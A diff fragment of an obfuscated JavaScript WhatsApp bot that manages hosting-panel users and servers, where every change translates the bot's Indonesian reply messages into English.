+          let _0x5e4943 = await _0x1595c1("Successfully added User and Server\n\nType: user\n\nId: " + _0x591181.id + "\nUsername: " + _0x591181.username + "\nEmail: " + _0x591181.email + "\nName: " + _0x591181.first_name + " " + _0x591181.last_name + "\nMemory: " + (_0x1ad66b.limits.memory === 0 ? "Unlimited" : _0x1ad66b.limits.memory) + " MB\nDisk: " + (_0x1ad66b.limits.disk === 0 ? "Unlimited" : _0x1ad66b.limits.disk + "MB") + "\nCpu: " + (_0x1ad66b.limits.cpu === 0 ? "Unlimited" : _0x1ad66b.limits.cpu + "%"));
         }
         break;
       case "4gb":
@@ -2198,7 +2198,7 @@ module.exports = async (sock, m, store) => {
           }
           let _0x169c3 = text2.split(",");
           if (_0x169c3.length < 2) {
-            return _0x1595c1("Format salah!\nPenggunaan:\n" + (prefixMatch + command) + " user,nomer");
+            return _0x1595c1("Wrong Format!\nUsage:\n" + (prefixMatch + command) + " user,nomer");
           }
           let _0xf28682 = _0x169c3[0];
           let _0x94244f = m.quoted ? m.quoted.sender : _0x169c3[1] ? _0x169c3[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : m.mentionedJid[0];
@@ -2304,7 +2304,7 @@ module.exports = async (sock, m, store) => {
             return sock(JSON.stringify(_0x32a78b.errors[0], null, 2));
           }
           let _0x1e1773 = _0x32a78b.attributes;
-          let _0x5ef22b = await _0x1595c1("Sukses menambahkan User dan Server\n\nType: user\n\nId: " + _0x2baf65.id + "\nUsername: " + _0x2baf65.username + "\nEmail: " + _0x2baf65.email + "\nName: " + _0x2baf65.first_name + " " + _0x2baf65.last_name + "\nMemory: " + (_0x1e1773.limits.memory === 0 ? "Unlimited" : _0x1e1773.limits.memory) + " MB\nDisk: " + (_0x1e1773.limits.disk === 0 ? "Unlimited" : _0x1e1773.limits.disk + "MB") + "\nCpu: " + (_0x1e1773.limits.cpu === 0 ? "Unlimited" : _0x1e1773.limits.cpu + "%"));
+          let _0x5ef22b = await _0x1595c1("Successfully added User and Server\n\nType: user\n\nId: " + _0x2baf65.id + "\nUsername: " + _0x2baf65.username + "\nEmail: " + _0x2baf65.email + "\nName: " + _0x2baf65.first_name + " " + _0x2baf65.last_name + "\nMemory: " + (_0x1e1773.limits.memory === 0 ? "Unlimited" : _0x1e1773.limits.memory) + " MB\nDisk: " + (_0x1e1773.limits.disk === 0 ? "Unlimited" : _0x1e1773.limits.disk + "MB") + "\nCpu: " + (_0x1e1773.limits.cpu === 0 ? "Unlimited" : _0x1e1773.limits.cpu + "%"));
         }
         break;
       case "5gb":
@@ -2317,7 +2317,7 @@ module.exports = async (sock, m, store) => {
           }
           let _0x38f0b7 = text2.split(",");
           if (_0x38f0b7.length < 2) {
-            return _0x1595c1("Format salah!\nPenggunaan:\n" + (prefixMatch + command) + " user,nomer");
+            return _0x1595c1("Wrong Format!\nUsage:\n" + (prefixMatch + command) + " user,nomer");
           }
           let _0x2fb173 = _0x38f0b7[0];
           let _0x2c3d3a = m.quoted ? m.quoted.sender : _0x38f0b7[1] ? _0x38f0b7[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : m.mentionedJid[0];
@@ -2423,7 +2423,7 @@ module.exports = async (sock, m, store) => {
             return sock(JSON.stringify(_0x50f221.errors[0], null, 2));
           }
           let _0x268e05 = _0x50f221.attributes;
-          let _0xe7edd7 = await _0x1595c1("Sukses menambahkan User dan Server\n\nType: user\n\nId: " + _0x4e0db4.id + "\nUsername: " + _0x4e0db4.username + "\nEmail: " + _0x4e0db4.email + "\nName: " + _0x4e0db4.first_name + " " + _0x4e0db4.last_name + "\nMemory: " + (_0x268e05.limits.memory === 0 ? "Unlimited" : _0x268e05.limits.memory) + " MB\nDisk: " + (_0x268e05.limits.disk === 0 ? "Unlimited" : _0x268e05.limits.disk + "MB") + "\nCpu: " + (_0x268e05.limits.cpu === 0 ? "Unlimited" : _0x268e05.limits.cpu + "%"));
+          let _0xe7edd7 = await _0x1595c1("Successfully added User and Server\n\nType: user\n\nId: " + _0x4e0db4.id + "\nUsername: " + _0x4e0db4.username + "\nEmail: " + _0x4e0db4.email + "\nName: " + _0x4e0db4.first_name + " " + _0x4e0db4.last_name + "\nMemory: " + (_0x268e05.limits.memory === 0 ? "Unlimited" : _0x268e05.limits.memory) + " MB\nDisk: " + (_0x268e05.limits.disk === 0 ? "Unlimited" : _0x268e05.limits.disk + "MB") + "\nCpu: " + (_0x268e05.limits.cpu === 0 ? "Unlimited" : _0x268e05.limits.cpu + "%"));
         }
         break;
       case "6gb":
@@ -2436,7 +2436,7 @@ module.exports = async (sock, m, store) => {
           }
           let _0x2f72a0 = text2.split(",");
           if (_0x2f72a0.length < 2) {
-            return _0x1595c1("Format salah!\nPenggunaan:\n" + (prefixMatch + command) + " user,nomer");
+            return _0x1595c1("Wrong Format!\nUsage:\n" + (prefixMatch + command) + " user,nomer");
           }
           let _0x246e96 = _0x2f72a0[0];
           let _0x4cf4a8 = m.quoted ? m.quoted.sender : _0x2f72a0[1] ? _0x2f72a0[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : m.mentionedJid[0];
@@ -2542,7 +2542,7 @@ module.exports = async (sock, m, store) => {
             return sock(JSON.stringify(_0x37fab5.errors[0], null, 2));
           }
           let _0x16784a = _0x37fab5.attributes;
-          let _0xc2e224 = await _0x1595c1("Sukses menambahkan User dan Server\n\nType: user\n\nId: " + _0x5ab707.id + "\nUsername: " + _0x5ab707.username + "\nEmail: " + _0x5ab707.email + "\nName: " + _0x5ab707.first_name + " " + _0x5ab707.last_name + "\nMemory: " + (_0x16784a.limits.memory === 0 ? "Unlimited" : _0x16784a.limits.memory) + " MB\nDisk: " + (_0x16784a.limits.disk === 0 ? "Unlimited" : _0x16784a.limits.disk + "MB") + "\nCpu: " + (_0x16784a.limits.cpu === 0 ? "Unlimited" : _0x16784a.limits.cpu + "%"));
+          let _0xc2e224 = await _0x1595c1("Successfully added User and Server\n\nType: user\n\nId: " + _0x5ab707.id + "\nUsername: " + _0x5ab707.username + "\nEmail: " + _0x5ab707.email + "\nName: " + _0x5ab707.first_name + " " + _0x5ab707.last_name + "\nMemory: " + (_0x16784a.limits.memory === 0 ? "Unlimited" : _0x16784a.limits.memory) + " MB\nDisk: " + (_0x16784a.limits.disk === 0 ? "Unlimited" : _0x16784a.limits.disk + "MB") + "\nCpu: " + (_0x16784a.limits.cpu === 0 ? "Unlimited" : _0x16784a.limits.cpu + "%"));
         }
         break;
       case "7gb":
@@ -2555,7 +2555,7 @@ module.exports = async (sock, m, store) => {
           }
           let _0x4e3936 = text2.split(",");
           if (_0x4e3936.length < 2) {
-            return _0x1595c1("Format salah!\nPenggunaan:\n" + (prefixMatch + command) + " user,nomer");
+            return _0x1595c1("Wrong Format!\nUsage:\n" + (prefixMatch + command) + " user,nomer");
           }
           let _0x4eabf6 = _0x4e3936[0];
           let _0x43faca = m.quoted ? m.quoted.sender : _0x4e3936[1] ? _0x4e3936[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : m.mentionedJid[0];
@@ -2661,7 +2661,7 @@ module.exports = async (sock, m, store) => {
             return sock(JSON.stringify(_0x180276.errors[0], null, 2));
           }
           let _0x2ae20a = _0x180276.attributes;
-          let _0x1d6f2f = await _0x1595c1("Sukses menambahkan User dan Server\n\nType: user\n\nId: " + _0x1bd781.id + "\nUsername: " + _0x1bd781.username + "\nEmail: " + _0x1bd781.email + "\nName: " + _0x1bd781.first_name + " " + _0x1bd781.last_name + "\nMemory: " + (_0x2ae20a.limits.memory === 0 ? "Unlimited" : _0x2ae20a.limits.memory) + " MB\nDisk: " + (_0x2ae20a.limits.disk === 0 ? "Unlimited" : _0x2ae20a.limits.disk + "MB") + "\nCpu: " + (_0x2ae20a.limits.cpu === 0 ? "Unlimited" : _0x2ae20a.limits.cpu + "%"));
+          let _0x1d6f2f = await _0x1595c1("Successfully added User and Server\n\nType: user\n\nId: " + _0x1bd781.id + "\nUsername: " + _0x1bd781.username + "\nEmail: " + _0x1bd781.email + "\nName: " + _0x1bd781.first_name + " " + _0x1bd781.last_name + "\nMemory: " + (_0x2ae20a.limits.memory === 0 ? "Unlimited" : _0x2ae20a.limits.memory) + " MB\nDisk: " + (_0x2ae20a.limits.disk === 0 ? "Unlimited" : _0x2ae20a.limits.disk + "MB") + "\nCpu: " + (_0x2ae20a.limits.cpu === 0 ? "Unlimited" : _0x2ae20a.limits.cpu + "%"));
         }
         break;
       case "8gb":
@@ -2674,7 +2674,7 @@ module.exports = async (sock, m, store) => {
           }
           let _0x41985f = text2.split(",");
           if (_0x41985f.length < 2) {
-            return _0x1595c1("Format salah!\nPenggunaan:\n" + (prefixMatch + command) + " user,nomer");
+            return _0x1595c1("Wrong Format!\nUsage:\n" + (prefixMatch + command) + " user,nomer");
           }
           let _0x1bf2dd = _0x41985f[0];
           let _0x15eb9d = m.quoted ? m.quoted.sender : _0x41985f[1] ? _0x41985f[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : m.mentionedJid[0];
@@ -2780,7 +2780,7 @@ module.exports = async (sock, m, store) => {
             return sock(JSON.stringify(_0x3ef728.errors[0], null, 2));
           }
           let _0x3d9c97 = _0x3ef728.attributes;
-          let _0xc87d1d = await _0x1595c1("Sukses menambahkan User dan Server\n\nType: user\n\nId: " + _0x8e699.id + "\nUsername: " + _0x8e699.username + "\nEmail: " + _0x8e699.email + "\nName: " + _0x8e699.first_name + " " + _0x8e699.last_name + "\nMemory: " + (_0x3d9c97.limits.memory === 0 ? "Unlimited" : _0x3d9c97.limits.memory) + " MB\nDisk: " + (_0x3d9c97.limits.disk === 0 ? "Unlimited" : _0x3d9c97.limits.disk + "MB") + "\nCpu: " + (_0x3d9c97.limits.cpu === 0 ? "Unlimited" : _0x3d9c97.limits.cpu + "%"));
+          let _0xc87d1d = await _0x1595c1("Successfully added User and Server\n\nType: user\n\nId: " + _0x8e699.id + "\nUsername: " + _0x8e699.username + "\nEmail: " + _0x8e699.email + "\nName: " + _0x8e699.first_name + " " + _0x8e699.last_name + "\nMemory: " + (_0x3d9c97.limits.memory === 0 ? "Unlimited" : _0x3d9c97.limits.memory) + " MB\nDisk: " + (_0x3d9c97.limits.disk === 0 ? "Unlimited" : _0x3d9c97.limits.disk + "MB") + "\nCpu: " + (_0x3d9c97.limits.cpu === 0 ? "Unlimited" : _0x3d9c97.limits.cpu + "%"));
         }
         break;
       case "9gb":
@@ -2793,7 +2793,7 @@ module.exports = async (sock, m, store) => {
           }
           let _0x4a698f = text2.split(",");
           if (_0x4a698f.length < 2) {
-            return _0x1595c1("Format salah!\nPenggunaan:\n" + (prefixMatch + command) + " user,nomer");
+            return _0x1595c1("Wrong Format!\nUsage:\n" + (prefixMatch + command) + " user,nomer");
           }
           let _0x169cd8 = _0x4a698f[0];
           let _0xde8104 = m.quoted ? m.quoted.sender : _0x4a698f[1] ? _0x4a698f[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : m.mentionedJid[0];
@@ -2899,7 +2899,7 @@ module.exports = async (sock, m, store) => {
             return sock(JSON.stringify(_0x1fd9d3.errors[0], null, 2));
           }
           let _0x4bb64e = _0x1fd9d3.attributes;
-          let _0x86a595 = await _0x1595c1("Sukses menambahkan User dan Server\n\nType: user\n\nId: " + _0x5ac503.id + "\nUsername: " + _0x5ac503.username + "\nEmail: " + _0x5ac503.email + "\nName: " + _0x5ac503.first_name + " " + _0x5ac503.last_name + "\nMemory: " + (_0x4bb64e.limits.memory === 0 ? "Unlimited" : _0x4bb64e.limits.memory) + " MB\nDisk: " + (_0x4bb64e.limits.disk === 0 ? "Unlimited" : _0x4bb64e.limits.disk + "MB") + "\nCpu: " + (_0x4bb64e.limits.cpu === 0 ? "Unlimited" : _0x4bb64e.limits.cpu + "%"));
+          let _0x86a595 = await _0x1595c1("Successfully added User and Server\n\nType: user\n\nId: " + _0x5ac503.id + "\nUsername: " + _0x5ac503.username + "\nEmail: " + _0x5ac503.email + "\nName: " + _0x5ac503.first_name + " " + _0x5ac503.last_name + "\nMemory: " + (_0x4bb64e.limits.memory === 0 ? "Unlimited" : _0x4bb64e.limits.memory) + " MB\nDisk: " + (_0x4bb64e.limits.disk === 0 ? "Unlimited" : _0x4bb64e.limits.disk + "MB") + "\nCpu: " + (_0x4bb64e.limits.cpu === 0 ? "Unlimited" : _0x4bb64e.limits.cpu + "%"));
         }
         break;
       case "unli":
@@ -2912,7 +2912,7 @@ module.exports = async (sock, m, store) => {
           }
           let _0x3cdf80 = text2.split(",");
           if (_0x3cdf80.length < 2) {
-            return _0x1595c1("Format salah!\nPenggunaan:\n" + (prefixMatch + command) + " user,nomer");
+            return _0x1595c1("Wrong Format!\nUsage:\n" + (prefixMatch + command) + " user,nomer");
           }
           let _0x2cda55 = _0x3cdf80[0];
           let _0x4c611c = m.quoted ? m.quoted.sender : _0x3cdf80[1] ? _0x3cdf80[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : m.mentionedJid[0];
@@ -3018,7 +3018,7 @@ module.exports = async (sock, m, store) => {
             return sock(JSON.stringify(_0x421d42.errors[0], null, 2));
           }
           let _0x1b98c4 = _0x421d42.attributes;
-          let _0x3b1774 = await _0x1595c1("Sukses menambahkan User dan Server\n\nType: user\n\nId: " + _0x346d06.id + "\nUsername: " + _0x346d06.username + "\nEmail: " + _0x346d06.email + "\nName: " + _0x346d06.first_name + " " + _0x346d06.last_name + "\nMemory: " + (_0x1b98c4.limits.memory === 0 ? "Unlimited" : _0x1b98c4.limits.memory) + " MB\nDisk: " + (_0x1b98c4.limits.disk === 0 ? "Unlimited" : _0x1b98c4.limits.disk + "MB") + "\nCpu: " + (_0x1b98c4.limits.cpu === 0 ? "Unlimited" : _0x1b98c4.limits.cpu + "%"));
+          let _0x3b1774 = await _0x1595c1("Successfully added User and Server\n\nType: user\n\nId: " + _0x346d06.id + "\nUsername: " + _0x346d06.username + "\nEmail: " + _0x346d06.email + "\nName: " + _0x346d06.first_name + " " + _0x346d06.last_name + "\nMemory: " + (_0x1b98c4.limits.memory === 0 ? "Unlimited" : _0x1b98c4.limits.memory) + " MB\nDisk: " + (_0x1b98c4.limits.disk === 0 ? "Unlimited" : _0x1b98c4.limits.disk + "MB") + "\nCpu: " + (_0x1b98c4.limits.cpu === 0 ? "Unlimited" : _0x1b98c4.limits.cpu + "%"));
         }
         break;
       case "listsrv":
@@ -3038,7 +3038,7 @@ module.exports = async (sock, m, store) => {
           let _0x5ee3fb = await _0x3b2b7d.json();
           let _0x380825 = _0x5ee3fb.data;
           let _0x35fc4a = [];
-          let _0x2e3e56 = "Berikut adalah daftar server:\n\n";
+          let _0x2e3e56 = "Here is the list of servers:\n\n";
           for (let _0x57a4e1 of _0x380825) {
             let _0x6a3ea8 = _0x57a4e1.attributes;
             let _0x47d9c0 = await fetch(domain + "/api/client/servers/" + _0x6a3ea8.uuid.split`-`[0] + "/resources", {
@@ -3064,7 +3064,7 @@ module.exports = async (sock, m, store) => {
             quoted: m
           });
           if (_0x5ee3fb.meta.pagination.current_page < _0x5ee3fb.meta.pagination.total_pages) {
-            _0x1595c1("Gunakan perintah " + (prefixMatch ? prefixMatch : ".") + "listsrv " + (_0x5ee3fb.meta.pagination.current_page + 1) + " untuk melihat halaman selanjutnya.");
+            _0x1595c1("Use the command " + (prefixMatch ? prefixMatch : ".") + "listsrv " + (_0x5ee3fb.meta.pagination.current_page + 1) + " to see the next page.");
           }
         }
         break;
@@ -3075,7 +3075,7 @@ module.exports = async (sock, m, store) => {
           }
           let _0x1f2a34 = args[0];
           if (!_0x1f2a34) {
-            return _0x1595c1("ID nya mana?");
+            return _0x1595c1("Where's the ID?");
           }
           let _0x559461 = await fetch(domain + "/api/application/servers/" + _0x1f2a34, {
             method: "DELETE",
@@ -3089,9 +3089,9 @@ module.exports = async (sock, m, store) => {
             errors: null
           } : await _0x559461.json();
           if (_0x440586.errors) {
-            return _0x1595c1("Server tidak ditemukan");
+            return _0x1595c1("Server not found");
           }
-          _0x1595c1("Berhasil minghapus Server.");
+          _0x1595c1("Successfully deleted the Server.");
         }
         break;
       case "totalfitur":
